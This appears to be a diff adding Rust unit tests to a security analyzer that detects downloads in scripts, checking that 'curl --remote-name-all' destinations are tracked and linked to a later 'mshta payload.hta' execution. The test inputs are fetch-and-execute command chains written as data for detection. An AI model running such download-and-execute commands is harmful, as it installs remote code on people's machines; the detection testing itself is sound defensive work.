@@ -6225,6 +6225,41 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_remote_name_all_uses_basename_for_later_execution() {
+        let report = analyze(
+            br#"curl --remote-name-all https://curl-remote-name-all.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has_download_dst = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://curl-remote-name-all.example/payload.hta"
+                        && dst == "payload.hta"
+            )
+        });
+        assert!(
+            has_download_dst,
+            "curl --remote-name-all did not record remote-name destination: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://curl-remote-name-all.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta local HTA did not resolve curl --remote-name-all source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn curl_compact_remote_name_flag_uses_basename() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl -LO http://x/foo.exe", &mut env);
@@ -6310,6 +6345,27 @@ mshta C:\Temp\stage.hta"#,
                 )
             }),
             "curl --output-dir relative -o destination not recovered in deob text: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_remote_name_all_in_deob_text_uses_basename() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --remote-name-all https://curl-remote-name-all-deob.example/payload.hta"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-remote-name-all-deob.example/payload.hta"
+                        && dst.as_deref() == Some("payload.hta")
+            )
+        });
+        assert!(
+            has,
+            "curl deob-text --remote-name-all destination not recovered: {:?}",
             env.traits
         );
     }
